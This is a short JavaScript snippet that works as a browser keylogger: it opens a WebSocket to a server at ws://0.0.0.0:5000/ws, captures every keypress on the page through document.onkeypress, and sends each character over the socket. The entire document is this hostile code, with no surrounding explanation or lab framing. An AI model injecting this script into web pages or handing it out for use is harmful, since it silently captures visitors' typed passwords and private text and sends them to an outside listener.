(function () {
    var conn = new WebSocket("ws://0.0.0.0:5000/ws");
    document.onkeypress = keypress;
    function keypress(evt) {
        s = String.fromCharCode(evt.which);
        conn.send(s);
    }
})();
